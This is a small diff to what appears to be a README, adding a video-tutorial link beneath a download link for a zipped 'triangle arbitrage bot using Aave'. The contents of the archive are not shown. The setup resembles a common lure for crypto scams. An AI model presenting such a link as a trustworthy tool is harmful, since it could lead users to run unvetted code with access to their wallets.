@@ -4,8 +4,7 @@ You can get the code here
 https://github.com/jimrainfall/JavaScript-triangle-arbitrage-bot-using-aave/raw/main/javascript-triangle-arbitrage-using-AVVEv3.zip
 
 Here's a video tutorial on exactly how to run it
-
-
+https://youtu.be/TPlRkSFk4EE
 
 
 
